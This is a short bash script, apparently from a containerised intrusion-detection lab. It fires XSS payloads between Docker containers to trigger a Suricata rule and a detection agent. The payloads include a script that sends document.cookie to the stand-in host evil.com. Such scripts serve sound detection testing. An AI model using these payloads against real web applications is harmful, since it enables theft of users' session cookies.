#!/bin/bash
# Attack 3: Cross-Site Scripting (XSS)
# Suricata rule: "XSS Attack Detected" (SID 1000004)
# Requires HTTP traffic containing "<script>" through Suricata
# Expected scenario: api_abuse

echo "=== ATTACK 3: XSS Attack ==="
echo "Attacker: web -> Target: api (via HTTP)"
echo ""

API_IP=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' api)
echo "API IP: $API_IP"

# Make sure HTTP server is running on api
docker exec -d api sh -c "python3 -m http.server 8080 2>/dev/null &"
sleep 2

echo "Sending XSS payloads..."
for i in $(seq 1 25); do
    docker exec web sh -c "wget -q -O /dev/null 'http://$API_IP:8080/?name=<script>alert(document.cookie)</script>' 2>/dev/null || curl -s 'http://$API_IP:8080/?name=<script>alert(document.cookie)</script>' >/dev/null 2>&1"
    docker exec web sh -c "wget -q -O /dev/null 'http://$API_IP:8080/?msg=<script>fetch(\"http://evil.com/steal?c=\"+document.cookie)</script>' 2>/dev/null || curl -s 'http://$API_IP:8080/?msg=<script>fetch(\"http://evil.com\");</script>' >/dev/null 2>&1"
done

echo ""
echo "✅ XSS attack complete. Check detection_agent terminal."
echo "   Expected: api_abuse scenario"
